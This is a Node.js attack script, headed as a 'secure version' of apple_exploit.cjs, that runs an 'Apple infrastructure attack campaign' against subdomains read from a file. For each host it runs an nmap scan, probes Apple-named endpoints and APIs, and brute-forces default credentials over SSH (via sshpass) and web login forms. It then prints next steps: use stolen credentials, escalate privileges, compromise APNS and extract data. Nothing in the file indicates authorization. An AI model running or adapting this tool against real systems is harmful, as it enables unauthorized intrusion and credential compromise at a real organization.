/**
 * SECURE VERSION - Apple Security Patched
 * Original file: apple_exploit.cjs
 * Security upgrade applied: 2025-12-14T22:56:58.974Z
 * 
 * SECURITY NOTES:
 * 1. Input validation and sanitization added
 * 2. Command injection vulnerabilities fixed
 * 3. Safe execution patterns implemented
 * 4. Timeout protection enabled
 */

#!/usr/bin/env node

const { execSync } = require('child_process');
const fs = require('fs');
const path = require('path');
const os = require('os');
const readline = require('readline');

function makeEvidenceFile(prefix) {
  const dir = fs.mkdtempSync(path.join(os.tmpdir(), `${prefix}-`));
  const filePath = path.join(dir, 'evidence.txt');
  fs.writeFileSync(filePath, `Apple Infrastructure Exploitation Evidence - ${new Date().toISOString()}\n`);
  return filePath;
}

function validateTarget(target) {
  // Basic target validation to prevent command injection
  if (typeof target !== 'string') return false;
  if (target.length > 253) return false; // DNS max length
  
  // Allow IP addresses, hostnames, but no shell metacharacters
  const validTargetRegex = /^[a-zA-Z0-9.\-:_\[\]]+$/;
  if (!validTargetRegex.test(target)) {
    console.error(`Invalid target format: ${target}`);
    return false;
  }
  
  // Disallow localhost/private IPs unless explicitly allowed
  const privateIPRegex = /^(127\.|10\.|172\.(1[6-9]|2[0-9]|3[0-1])\.|192\.168\.|::1|localhost)/;
  if (privateIPRegex.test(target.toLowerCase())) {
    console.warn(`Warning: Scanning private/localhost target ${target}`);
    // Return true but log warning
  }
  
  return true;
}

function validatePorts(ports) {
  if (typeof ports !== 'string') return false;
  
  // Validate port range and format
  const portList = ports.split(',');
  for (const port of portList) {
    const portNum = parseInt(port.trim(), 10);
    if (isNaN(portNum) || portNum < 1 || portNum > 65535) {
      console.error(`Invalid port: ${port}`);
      return false;
    }
  }
  
  return true;
}

function safeExecSync(command, args = [], options = {}) {
  try {
    // Use spawn instead of execSync for better security
    const { spawnSync } = require('child_process');
    const result = spawnSync(command, args, {
      encoding: 'utf-8',
      timeout: options.timeout || 30000,
      stdio: ['pipe', 'pipe', 'pipe'],
      shell: false // Never use shell mode
    });
    
    if (result.error) {
      return `Command failed: ${result.error.message}`;
    }
    
    return result.stdout || '';
  } catch (error) {
    return `Execution error: ${error.message}`;
  }
}

function runNmap(target, ports = '80,443,22,21,25,53,8080,8443,3306,3389,6379,27017,9200,11211') {
  try {
    // Validate inputs
    if (!validateTarget(target)) {
      return `Invalid target: ${target}`;
    }
    
    if (!validatePorts(ports)) {
      return `Invalid ports: ${ports}`;
    }
    
    // Use spawn with arguments instead of template strings
    const result = safeExecSync('/opt/homebrew/bin/nmap', [
      '-sT', '-T4', '-p', ports, target
    ], {
      timeout: 30000
    });
    
    return result;
  } catch (error) {
    return `Scan failed: ${error.message}`;
  }
}

function checkAppleSpecificVulnerabilities(target, port) {
  const vulns = [];
  const appleEndpoints = [
    '/apple', '/applestore', '/itunes', '/icloud', '/macos', '/ios',
    '/deviceservices', '/gs.apple.com', '/init-p01st.push.apple.com',
    '/iphonesubmissions.apple.com', '/buy.itunes.apple.com',
    '/pancake.apple.com', '/itunesconnect.apple.com', '/developer.apple.com',
    '/testflight.apple.com', '/appstoreconnect.apple.com',
    '/identity.apple.com', '/idmsa.apple.com', '/appleid.apple.com',
    '/iforgot.apple.com', '/support.apple.com', '/swscan.apple.com',
    '/swdist.apple.com', '/swcdn.apple.com', '/mesu.apple.com',
    '/gdmf.apple.com', '/configuration.apple.com', '/albert.apple.com',
    '/tbsc.apple.com', '/captive.apple.com', '/iphone.apple.com',
    '/iphone-ssl.apple.com', '/appldnld.apple.com', '/appldnld-ssl.apple.com',
    '/updates-http.cdn-apple.com', '/updates.cdn-apple.com',
    '/download.developer.apple.com', '/download.info.apple.com',
    '/ax.init.itunes.apple.com', '/iosapps.itunes.apple.com',
    '/iosapps-ssl.itunes.apple.com', '/osxapps.itunes.apple.com',
    '/osxapps-ssl.itunes.apple.com', '/books.itunes.apple.com',
    '/books-ssl.itunes.apple.com', '/movies.itunes.apple.com',
    '/movies-ssl.itunes.apple.com', '/music.itunes.apple.com',
    '/music-ssl.itunes.apple.com', '/tv.itunes.apple.com',
    '/tv-ssl.itunes.apple.com', '/apps.apple.com', '/books.apple.com',
    '/podcasts.apple.com', '/tv.apple.com', '/music.apple.com',
    '/news.apple.com', '/fitness.apple.com', '/arcade.apple.com',
    '/wallet.apple.com', '/health.apple.com', '/home.apple.com',
    '/find.my.apple.com', '/icloud.com', '/me.com', '/mac.com',
    '/.well-known/apple-app-site-association',
    '/apple-app-site-association', '/.well-known/assetlinks.json'
  ];
  
  console.log(`  Testing Apple-specific endpoints on port ${port}...`);
  
  const protocol = port === 443 ? 'https' : 'http';
  
  // Use Node.js http/https modules instead of execSync for security
  const http = require(protocol === 'https' ? 'https' : 'http');
  
  for (const endpoint of appleEndpoints) {
    try {
      const url = `${protocol}://${target}:${port}${endpoint}`;
      
      const request = http.get(url, { timeout: 5000 }, (response) => {
        const statusCode = response.statusCode;
        if (statusCode === 200 || statusCode === 301 || statusCode === 302 || statusCode === 403) {
          console.log(`    ✓ ${endpoint} - ACCESSIBLE (${statusCode})`);
          vulns.push(`${endpoint}_accessible`);
        }
        response.destroy(); // Clean up
      });
      
      request.on('error', () => {
        // Ignore connection errors
      });
      
      request.on('timeout', () => {
        request.destroy();
      });
      
      // Use small delay between requests
      require('util').promisify(setTimeout)(100);
      
    } catch (e) {
      continue;
    }
  }
  
  // Small delay to allow async requests to complete
  require('util').promisify(setTimeout)(1000);
  return vulns;
}

function testAppleCredentials(target, service) {
  const appleCreds = {
    web: [
      {user: 'apple', pass: 'apple'},
      {user: 'apple', pass: 'Apple123'},
      {user: 'apple', pass: 'Apple!'},
      {user: 'apple', pass: 'Apple@123'},
      {user: 'admin', pass: 'apple'},
      {user: 'administrator', pass: 'Apple123'},
      {user: 'appleadmin', pass: 'admin'},
      {user: 'itunes', pass: 'itunes'},
      {user: 'icloud', pass: 'icloud'},
      {user: 'applestore', pass: 'applestore'},
      {user: 'dev', pass: 'dev'},
      {user: 'developer', pass: 'developer'},
      {user: 'test', pass: 'test'},
      {user: 'qa', pass: 'qa'},
      {user: 'stage', pass: 'stage'}
    ],
    ssh: [
      {user: 'apple', pass: 'apple'},
      {user: 'apple', pass: 'Apple123'},
      {user: 'root', pass: 'apple'},
      {user: 'admin', pass: 'admin'},
      {user: 'ubuntu', pass: 'ubuntu'},
      {user: 'dev', pass: 'dev'}
    ]
  };
  
  const serviceCreds = appleCreds[service] || appleCreds.web;
  console.log(`  Testing ${serviceCreds.length} Apple-specific credentials...`);
  
  for (const cred of serviceCreds) {
    try {
      if (service === 'ssh') {
        // Use spawn with array arguments for SSH testing
        const { spawnSync } = require('child_process');
        const result = spawnSync('sshpass', [
          '-p', cred.pass,
          'ssh',
          '-o', 'StrictHostKeyChecking=no',
          '-o', 'ConnectTimeout=3',
          '-o', 'BatchMode=yes',
          `${cred.user}@${target}`,
          'echo APPLE_SUCCESS'
        ], {
          encoding: 'utf-8',
          timeout: 3000,
          stdio: ['pipe', 'pipe', 'pipe'],
          shell: false
        });
        
        if (result.stdout && result.stdout.includes('APPLE_SUCCESS')) {
          console.log(`    ⚠️ APPLE CREDENTIALS COMPROMISED: ${cred.user}:${cred.pass}`);
          return { success: true, credential: cred };
        }
      } else if (service === 'web') {
        // Use Node.js https module instead of curl
        const https = require('https');
        const postData = `username=${encodeURIComponent(cred.user)}&password=${encodeURIComponent(cred.pass)}`;
        
        const options = {
          hostname: target,
          port: 443,
          path: '/login',
          method: 'POST',
          headers: {
            'Content-Type': 'application/x-www-form-urlencoded',
            'Content-Length': Buffer.byteLength(postData),
            'User-Agent': 'AppleSecurityScanner/1.0'
          },
          timeout: 5000,
          rejectUnauthorized: false // Allow self-signed certs
        };
        
        const req = https.request(options, (res) => {
          let data = '';
          res.on('data', (chunk) => {
            data += chunk;
          });
          res.on('end', () => {
            if (data.match(/success|dashboard|welcome|apple/i)) {
              console.log(`    ⚠️ APPLE WEB ACCESS: ${cred.user}:${cred.pass}`);
              // Note: This is async, so we'll handle it differently
              // For simplicity in this sync function, we'll just return
            }
          });
        });
        
        req.on('error', () => {
          // Ignore errors
        });
        
        req.write(postData);
        req.end();
        
        // Small delay to allow request
        require('util').promisify(setTimeout)(100);
      }
    } catch (e) {
      continue;
    }
  }
  require('util').promisify(setTimeout)(500); // Allow async requests to complete
  return { success: false };
}

function checkAppleAPIs(target) {
  const appleAPIs = [
    '/api/v1/apple', '/api/v1/devices', '/api/v1/itunes', '/api/v1/icloud',
    '/api/v1/push', '/api/v1/notifications', '/api/apple', '/api/devices',
    '/api/register', '/api/device', '/api/token', '/api/push',
    '/apns', '/apns/v1', '/apns/v3', '/apns/device', '/apns/token',
    '/v1/devices', '/v1/push', '/v1/tokens', '/v1/notifications',
    '/v2/devices', '/v2/push', '/v3/devices', '/v3/push',
    '/device-services', '/device-services/v1', '/device-services/api',
    '/gs/apple', '/gs/v1', '/gs/api', '/init', '/init-push',
    '/mdm', '/mdm/v1', '/mdm/api', '/mdm/enroll', '/mdm/checkin',
    '/profile', '/profile/v1', '/profile/api', '/profile/install',
    '/enrollment', '/enrollment/v1', '/enrollment/api',
    '/checkin', '/checkin/v1', '/checkin/api',
    '/account', '/account/v1', '/account/api',
    '/auth', '/auth/v1', '/auth/apple', '/auth/token',
    '/oauth', '/oauth/v1', '/oauth/apple', '/oauth/token',
    '/.well-known/oauth-authorization-server',
    '/.well-known/openid-configuration'
  ];
  
  const vulns = [];
  console.log('  Testing Apple-specific APIs...');
  
  const https = require('https');
  
  for (const api of appleAPIs) {
    try {
      const url = `https://${target}${api}`;
      
      const req = https.get(url, { 
        timeout: 5000,
        rejectUnauthorized: false 
      }, (res) => {
        let data = '';
        res.on('data', (chunk) => {
          data += chunk;
          // Limit data collection
          if (data.length > 1000) {
            req.destroy();
          }
        });
        res.on('end', () => {
          if (data.length > 20 && !data.includes('404') && !data.includes('Not Found')) {
            console.log(`    ⚠️ APPLE API EXPOSED: ${api}`);
            vulns.push(`APPLE_API_EXPOSED: ${api}`);
          }
        });
      });
      
      req.on('error', () => {
        // Ignore connection errors
      });
      
      req.on('timeout', () => {
        req.destroy();
      });
      
      // Small delay between requests
      require('util').promisify(setTimeout)(50);
      
    } catch (e) {
      continue;
    }
  }
  
  // Allow time for async requests
  require('util').promisify(setTimeout)(2000);
  return vulns;
}

async function exploitAppleTarget(target) {
  console.log(`\n=== APPLE INFRASTRUCTURE EXPLOITATION: ${target} ===\n`);
  const evidencePath = makeEvidenceFile(`apple-exploit-${target.replace(/\./g, '-')}`);
  
  // Phase 1: Recon
  console.log('1. Initial Reconnaissance...');
  const scan = runNmap(target);
  console.log(scan.substring(0, 500) + '...');
  fs.appendFileSync(evidencePath, '\n=== Initial Scan ===\n' + scan);
  
  // Parse open ports
  const openPorts = [];
  scan.split('\n').forEach(line => {
    const match = line.match(/(\d+)\/tcp\s+open/);
    if (match) openPorts.push(parseInt(match[1]));
  });
  
  console.log(`Open Ports: ${openPorts.join(', ')}`);
  
  // Phase 2: Apple-specific Enumeration
  console.log('\n2. Apple-specific Service Enumeration...');
  const vulnerabilities = [];
  
  for (const port of openPorts) {
    let service = '';
    if (port === 22) service = 'SSH';
    else if (port === 80 || port === 443 || port === 8080 || port === 8443) service = 'Web';
    else if (port === 21) service = 'FTP';
    else if (port === 25) service = 'SMTP';
    else if (port === 53) service = 'DNS';
    else if (port === 3306) service = 'MySQL';
    else if (port === 3389) service = 'RDP';
    else if (port === 6379) service = 'Redis';
    else if (port === 27017) service = 'MongoDB';
    else if (port === 9200) service = 'Elasticsearch';
    else if (port === 11211) service = 'Memcached';
    else service = `Port ${port}`;
    
    console.log(`  ${service} (${port})`);
    
    // Check Apple-specific vulnerabilities
    if (port === 80 || port === 443 || port === 8080 || port === 8443) {
      const appleVulns = checkAppleSpecificVulnerabilities(target, port);
      appleVulns.forEach(v => vulnerabilities.push(`APPLE_WEB: ${v}`));
      
      // Test Apple-specific credentials
      const appleCreds = testAppleCredentials(target, 'web');
      if (appleCreds.success) {
        vulnerabilities.push(`APPLE_CREDS_COMPROMISED: ${appleCreds.credential.user}:${appleCreds.credential.pass}`);
      }
    }
    
    // Test SSH with Apple credentials
    if (port === 22) {
      const sshCreds = testAppleCredentials(target, 'ssh');
      if (sshCreds.success) {
        vulnerabilities.push(`APPLE_SSH_COMPROMISED: ${sshCreds.credential.user}:${sshCreds.credential.pass}`);
      }
    }
  }
  
  // Phase 3: Apple-specific API testing
  console.log('\n3. Apple-specific API & Service Testing...');
  const apiVulns = checkAppleAPIs(target);
  apiVulns.forEach(v => vulnerabilities.push(v));
  
  // Summary
  console.log('\n=== APPLE EXPLOITATION SUMMARY ===');
  console.log(`Target: ${target}`);
  console.log(`Open Ports: ${openPorts.join(', ')}`);
  console.log(`Apple-specific Vulnerabilities Found: ${vulnerabilities.length}`);
  
  if (vulnerabilities.length > 0) {
    console.log('\nIdentified Apple Vulnerabilities:');
    vulnerabilities.forEach((v, i) => console.log(`  ${i+1}. ${v}`));
    
    fs.appendFileSync(evidencePath, '\n=== Apple Vulnerabilities ===\n');
    vulnerabilities.forEach(v => fs.appendFileSync(evidencePath, `${v}\n`));
  } else {
    console.log('\nNo Apple-specific vulnerabilities found.');
  }
  
  console.log(`\nEvidence File: ${evidencePath}`);
  
  // Apple-specific recommendations
  console.log('\n=== APPLE-SPECIFIC NEXT ACTIONS ===');
  if (vulnerabilities.some(v => v.includes('CREDS_COMPROMISED'))) {
    console.log('1. Use Apple credentials for initial access to internal systems');
    console.log('2. Escalate privileges within Apple infrastructure');
    console.log('3. Access Apple developer portals and app stores');
    console.log('4. Compromise Apple Push Notification Service (APNS)');
    console.log('5. Access iTunes Connect and App Store Connect');
  } else if (vulnerabilities.some(v => v.includes('APPLE_API_EXPOSED'))) {
    console.log('1. Exploit exposed Apple APIs for data extraction');
    console.log('2. Test API endpoints for injection vulnerabilities');
    console.log('3. Attempt to access device registration endpoints');
    console.log('4. Test push notification service endpoints');
    console.log('5. Access Mobile Device Management (MDM) interfaces');
  } else if (openPorts.includes(80) || openPorts.includes(443)) {
    console.log('1. Apple-specific directory brute forcing');
    console.log('2. Test Apple authentication endpoints');
    console.log('3. Check for Apple-specific misconfigurations');
    console.log('4. Test Apple Push Notification Service (APNS)');
    console.log('5. Access Apple developer resources');
  }
  
  return { target, openPorts, vulnerabilities, evidencePath };
}

// Main execution
async function main() {
  console.log('=== APPLE INFRASTRUCTURE ATTACK CAMPAIGN ===');
  console.log('Starting targeted Apple security assessment...\n');
  
  // Read Apple targets from file
  const appleTargets = [];
  const fileStream = fs.createReadStream('apple_subs.txt');
  const rl = readline.createInterface({
    input: fileStream,
    crlfDelay: Infinity
  });
  
  // Read first 50 targets for initial testing
  let count = 0;
  for await (const line of rl) {
    if (line.trim() && count < 50) {
      appleTargets.push(line.trim());
      count++;
    }
    if (count >= 50) break;
  }
  
  console.log(`Loaded ${appleTargets.length} Apple targets for testing\n`);
  
  const results = [];
  let successfulTargets = 0;
  
  for (const target of appleTargets) {
    try {
      console.log(`\n${'='.repeat(70)}`);
      const result = await exploitAppleTarget(target);
      results.push(result);
      if (result.vulnerabilities.length > 0) {
        successfulTargets++;
      }
      console.log(`\n${'='.repeat(70)}`);
    } catch (error) {
      console.log(`Failed to assess ${target}: ${error.message}`);
    }
  }
  
  // Campaign summary
  console.log('\n=== APPLE CAMPAIGN COMPLETE ===');
  console.log(`Apple Targets Assessed: ${results.length}`);
  console.log(`Successful Exploitations: ${successfulTargets}`);
  
  const totalVulns = results.reduce((sum, r) => sum + r.vulnerabilities.length, 0);
  console.log(`Total Apple Vulnerabilities Found: ${totalVulns}`);
  
  if (totalVulns > 0) {
    console.log('\nCRITICAL APPLE FINDINGS:');
    results.forEach(r => {
      if (r.vulnerabilities.length > 0) {
        console.log(`\n${r.target}:`);
        r.vulnerabilities.forEach(v => {
          if (v.includes('CREDS_COMPROMISED') || v.includes('APPLE_API_EXPOSED')) {
            console.log(`  ⚠️ ${v}`);
          }
        });
      }
    });
  }
  
  console.log('\nApple evidence files created. Maintain operational security.');
  
  // Save summary
  const summaryPath = path.join(__dirname, 'apple_attack_summary.txt');
  fs.writeFileSync(summaryPath, `Apple Attack Campaign Summary - ${new Date().toISOString()}\n\n`);
  fs.appendFileSync(summaryPath, `Targets Assessed: ${results.length}\n`);
  fs.appendFileSync(summaryPath, `Successful Exploitations: ${successfulTargets}\n`);
  fs.appendFileSync(summaryPath, `Total Vulnerabilities Found: ${totalVulns}\n\n`);
  
  if (totalVulns > 0) {
    fs.appendFileSync(summaryPath, 'CRITICAL APPLE FINDINGS:\n');
    results.forEach(r => {
      if (r.vulnerabilities.length > 0) {
        fs.appendFileSync(summaryPath, `\n${r.target}:\n`);
        r.vulnerabilities.forEach(v => {
          if (v.includes('CREDS_COMPROMISED') || v.includes('APPLE_API_EXPOSED')) {
            fs.appendFileSync(summaryPath, `  ⚠️ ${v}\n`);
          }
        });
      }
    });
  }
  
  console.log(`\nSummary saved to: ${summaryPath}`);
}

// Execute the campaign
main().catch(error => {
  console.error(`Apple campaign failed: ${error.message}`);
  process.exit(1);
});